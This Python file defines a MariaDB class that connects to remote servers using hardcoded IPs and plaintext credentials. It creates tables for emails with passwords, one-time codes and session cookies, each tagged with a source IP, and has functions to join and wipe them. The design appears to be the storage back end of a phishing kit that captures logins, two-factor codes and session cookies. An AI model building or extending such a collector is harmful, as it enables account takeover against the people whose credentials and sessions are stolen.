# Module Imports
import mariadb
import sys 
from datetime import datetime
class MariaDB:
    def __init__(self):
        try: 
            self.conn = mariadb.connect( 
                user="amine", 
                password="amine", 
                host="161.97.178.112", 
                port=3307, 
                database="ea_python" 
            )
            print('MariaDb has succussfully connected')
            self.curr = self.conn.cursor()
        except mariadb.Error as e: 
            print(f"Error connecting to MariaDB Platform: {e}") 
            self.conn = None
            self.curr = None
        # Connect to MariaDB Platform
    def connect():
        try: 
            conn = mariadb.connect( 
                user="amine", 
                password="amine", 
                host="144.91.92.58", 
                port=3307, 
                database="ea_python" 
            ) 
            print('connected to db ')
            curr = conn.cursor()
            return (conn, curr)
        except mariadb.Error as e: 
            print(f"Error connecting to MariaDB Platform: {e}") 
            conn = "error"
            sys.exit(1) 

    def createTables(self):
        # DROP TABLES WITH :
        # self.curr.execute('DROP TABLE IF EXISTS Auth')
        # self.curr.execute('DROP TABLE IF EXISTS Code')
        cmd_createAuth = "CREATE TABLE IF NOT EXISTS Auth(id_time TEXT UNIQUE KEY NOT NULL, email TEXT, password TEXT, ip TEXT)"
        cmd_createCode = "CREATE TABLE IF NOT EXISTS Code(id_time TEXT UNIQUE KEY NOT NULL, code TEXT, ip TEXT)"
        cmd_createCookies = "CREATE TABLE IF NOT EXISTS Cookies(id_time TEXT UNIQUE KEY NOT NULL, cookies TEXT, ip TEXT)"
        if self.curr.execute(cmd_createAuth) :
            print('auth table created')
        else : 
            print('auth table already exists')
        if self.curr.execute(cmd_createCode) :
            print('code table created')
        else : 
            print('code table already exists')
        if self.curr.execute(cmd_createCookies):
            print('Cookies Table Created')
        else : 
            print('Cookies Table Already EXISTS')
    # print('Cookies table created')
        self.conn.commit()

    def addAuth(self, _id, email, password, ip):
        self.curr.execute("INSERT INTO Auth(id_time,email,password,ip) VALUES(?,?,?,?)",(_id,email,password,ip))
        self.conn.commit()
        print("login infos added")

    def addCode(self, _id, code, ip):
        self.curr.execute("INSERT INTO Code(id_time,code,ip) VALUES(?,?,?)",(_id, code, ip))
        self.conn.commit()
        print("code added")
    
    def addCookies(self, _id, cookies, ip):
        self.curr.execute("INSERT INTO Cookies(id_time,cookies,ip) VALUES(?,?,?)",(_id,cookies,ip))
        self.conn.commit()
        print("cookies infos added TO DB")

    ########################################
        
    def clearAuths(self):
        cmd = "TRUNCATE TABLE Auth"
        self.curr.execute(cmd)
        print('Auth table Cleared')


    def clearCode(self):
        cmd = "TRUNCATE TABLE Code"
        self.curr.execute(cmd)
        print('Code table Cleared')

    def clearCookies(self):
        cmd = "TRUNCATE TABLE Cookies"
        self.curr.execute(cmd)
        print('Cookies table Cleared')

    def clearRecords(self):
        self.clearAuths()
        self.clearCode()
        self.clearCookies()

    #########################################


    def getAuth(self):
        cmd ="SELECT * FROM Auth"
        self.curr.execute(cmd)
        #result = list(self.curr)
        #print(result)
        return list(self.curr)

    def getCodes(self):
        # dbConn, curr = connect()
        cmd = "SELECT * FROM Code"
        self.curr.execute(cmd)
        #print(list(self.curr))
        return list(self.curr)
    
    def getCookies(self):
        cmd = "SELECT * FROM Cookies"
        self.curr.execute(cmd)
        #print(list(self.curr))
        return list(self.curr)

    def getAll(self):
        # dbConn, curr = connect()
        cmd = """
        SELECT DISTINCT Auth.ip, Auth.email, Auth.password, Code.code, Cookies.cookies
        FROM Auth
        INNER JOIN Code
                ON Auth.id_time = Code.id_time
        INNER JOIN Cookies
                ON Cookies.id_time = Auth.id_time
        """
        # result = curr.execute(cmd)
        self.curr.execute(cmd)
        #print(list(self.curr))
        #print('result->',result)
        return list(self.curr)
        # return result.fetchall()

# db = MariaDB()
# # db.clearRecords()
# db.createTables()
# print(db.getCookies())
# db.clearAuths()
# _id = datetime.now()
# db.addAuth(_id, 'em@em.em','passpass',"address ip")
# # from time import sleep
# # sleep(1)
# _id = datetime.now()
# db.addAuth(_id, 'em@em.em','passpass',"address ip")
# # sleep(1)
# _id = datetime.now()
# db.addAuth(_id, 'em@em.em','passpass',"address ip")
# # sleep(1)
# _id = datetime.now()
# db.addAuth(_id, 'em@em.em','passpass',"address ip")
# db.getAuth()
# db.addCode(_id, '545445', 'address ip')
# db.getCodes()
# # Generate unique ID :
# print('all*****')
#db.getAll()

# addAuth('em@em.em','paspas','ip.ip.ip.ip')
# getAuth()
